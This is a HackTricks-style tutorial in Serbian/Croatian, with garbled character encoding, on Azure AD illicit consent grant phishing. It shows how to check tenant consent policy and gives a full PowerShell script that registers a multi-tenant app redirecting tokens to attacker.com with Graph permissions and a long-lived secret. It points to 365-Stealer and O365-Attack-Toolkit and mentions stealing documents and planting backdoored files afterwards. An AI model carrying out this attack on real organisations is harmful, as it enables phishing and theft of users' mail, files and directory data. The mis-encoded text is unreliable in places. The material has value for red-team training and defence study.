# Az - NeovlaÅ¡Ä‡eno dodeljivanje saglasnosti

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## FiÅ¡ing OAuth aplikacija

**Azure aplikacije** traÅ¾e dozvole za pristup **korisniÄkim podacima** (osnovne informacije, ali i pristup dokumentima, slanje e-poÅ¡te...).\
Ako je **dozvoljeno**, obiÄan korisnik moÅ¾e dati saglasnost samo za **"niski uticaj" dozvole**. U **svim ostalim** sluÄajevima, potrebna je **saglasnost administratora**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` i prilagoÄ‘ena uloga koja ukljuÄuje `dozvolu za dodeljivanje dozvola aplikacijama` mogu obezbediti saglasnost za celu organizaciju.

Samo dozvole koje **ne zahtevaju saglasnost administratora** klasifikovane su kao **niski uticaj**. To su dozvole potrebne za **osnovnu prijavu openid, profil, e-poÅ¡ta, User.Read i offline\_access**. Ako **organizacija** **omoguÄ‡ava** korisniÄku saglasnost za **sve aplikacije**, zaposleni moÅ¾e dati saglasnost aplikaciji da **proÄita navedeno iz svog profila**.

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

Stoga, napadaÄ moÅ¾e pripremiti **zlonamernu aplikaciju** i putem **fiÅ¡inga** naterati korisnika da **prihvati aplikaciju i ukrade njegove podatke**.

### Provera da li korisnici mogu dati saglasnost

SledeÄ‡a PowerShell komanda se koristi za proveru konfiguracije saglasnosti za korisnike u Azure Active Directory (Azure AD) u vezi sa njihovom sposobnoÅ¡Ä‡u da daju saglasnost aplikacijama:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **OnemoguÄ‡i pristanak korisnika**: Ova postavka zabranjuje korisnicima da daju dozvole aplikacijama. Korisnicima nije dozvoljeno davanje pristanka aplikacijama.
* **Korisnici mogu dati pristanak za aplikacije od verifikovanih izdavaÄa ili vaÅ¡e organizacije, ali samo za odabrane dozvole**: Ova postavka omoguÄ‡ava svim korisnicima da daju pristanak samo za aplikacije koje su objavljene od strane verifikovanog izdavaÄa i aplikacije registrovane u vaÅ¡em sopstvenom okruÅ¾enju. Dodaje se sloj kontrole koji omoguÄ‡ava pristanak samo za odreÄ‘ene dozvole.
* **Korisnici mogu dati pristanak za sve aplikacije**: Ova postavka je dozvoljavajuÄ‡a i omoguÄ‡ava svim korisnicima da daju pristanak za bilo koje dozvole za aplikacije, pod uslovom da te dozvole ne zahtevaju administrativni pristanak.
* **PrilagoÄ‘ena politika pristanka aplikacija**: Ova postavka ukazuje da je na snazi prilagoÄ‘ena politika koja se moÅ¾e prilagoditi specifiÄnim organizacionim zahtevima i moÅ¾e ukljuÄivati kombinaciju ograniÄenja zasnovanih na izdavaÄu aplikacije, dozvolama koje aplikacija zahteva i drugim faktorima.


## **Razumevanje napada neovlaÅ¡Ä‡enog davanja pristanka**

U napadu neovlaÅ¡Ä‡enog davanja pristanka, napadaÄi prevare krajnje korisnike da daju dozvole zlonamernoj aplikaciji registrovanoj u Azure-u. To se postiÅ¾e tako Å¡to se aplikacija prikazuje kao legitimna, Å¡to dovodi Å¾rtve da nesvesno kliknu na dugme "Prihvati". Kao rezultat toga, Azure AD izdaje token sajtu napadaÄa, omoguÄ‡avajuÄ‡i im pristup i manipulaciju podacima Å¾rtve, kao Å¡to su Äitanje ili slanje e-poÅ¡te i pristupanje datotekama, bez potrebe za organizacionim nalogom.

## **Pregled toka napada**

Napad ukljuÄuje nekoliko koraka koji ciljaju na generiÄku kompaniju. Evo kako bi se mogao odvijati:

1. **Registracija domena i hosting aplikacije**: NapadaÄ registruje domen koji liÄi na pouzdan sajt, na primer, "safedomainlogin.com". Pod ovim domenom, kreira se poddomen (na primer, "companyname.safedomainlogin.com") za hostovanje aplikacije koja je dizajnirana da uhvati autorizacione kodove i zatraÅ¾i pristupne tokene.

2. **Registracija aplikacije u Azure AD**: NapadaÄ zatim registruje Multi-Tenant aplikaciju u svom Azure AD okruÅ¾enju, dajuÄ‡i joj ime po ciljnoj kompaniji da bi delovala legitimno. KonfiguriÅ¡e Redirect URL aplikacije da upuÄ‡uje na poddomen koji hostuje zlonamernu aplikaciju.

3. **Postavljanje dozvola**: NapadaÄ postavlja aplikaciju sa razliÄitim API dozvolama (na primer, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Ove dozvole, kada ih korisnik odobri, omoguÄ‡avaju napadaÄu da izvuÄe osetljive informacije u ime korisnika.

4. **Distribucija zlonamernih linkova**: NapadaÄ kreira link koji sadrÅ¾i klijentski ID zlonamerne aplikacije i deli ga sa ciljanim korisnicima, prevareÄ‡i ih da daju pristanak.

## **KoriÅ¡Ä‡enje alata za napad**

Napad se moÅ¾e olakÅ¡ati koriÅ¡Ä‡enjem alata kao Å¡to je [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

### Priprema pre napada:
Ako napadaÄ ima odreÄ‘eni nivo pristupa korisniku u organizaciji Å¾rtve, moÅ¾e proveriti da li politika organizacije dozvoljava korisniku da prihvati aplikacije:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Da bi izvrÅ¡io napad, napadaÄ bi trebao kreirati **novu aplikaciju u svom Azure Tenantu** (u registraciji aplikacija), konfiguriranu s dozvolama:

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` se nalazi unutar `Microsoft Graph` u `Delegated permissions`. (Dozvole aplikacije uvijek Ä‡e zahtijevati dodatno odobrenje).

* `User.ReadBasic.All` je dozvola koja Ä‡e vam omoguÄ‡iti **Äitanje informacija svih korisnika** u organizaciji ako je odobrena.
* Zapamtite da samo `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` i prilagoÄ‘ena uloga koja ukljuÄuje `dozvolu za dodjeljivanje dozvola aplikacijama` mogu dati pristanak na razini tenant-a. Dakle, trebali biste **phishirati korisnika s jednom od tih uloga** ako Å¾elite da odobri **aplikaciju koja zahtijeva administratorski pristanak**.

TakoÄ‘er moÅ¾ete kreirati aplikaciju putem CLI-a koristeÄ‡i:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Proverite [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) da biste saznali kako ga konfigurisati.

{% hint style="warning" %}
Imajte na umu da Ä‡e dobijeni **pristupni token** biti za **graph endpoint** sa opsegom: `User.Read` i `User.ReadBasic.All` (zahtevane dozvole). NeÄ‡ete moÄ‡i da izvrÅ¡ite druge radnje (ali to je dovoljno da **preuzmete informacije o svim korisnicima** u organizaciji).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

MoÅ¾ete takoÄ‘e koristiti ovaj alat za izvoÄ‘enje ovog napada.

## Post-Exploitation

Kada dobijete pristup korisniku, moÅ¾ete raditi stvari kao Å¡to je kraÄ‘a osetljivih dokumenata, pa Äak i otpremanje dokumenta sa zadnjim vratima.

## Reference

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
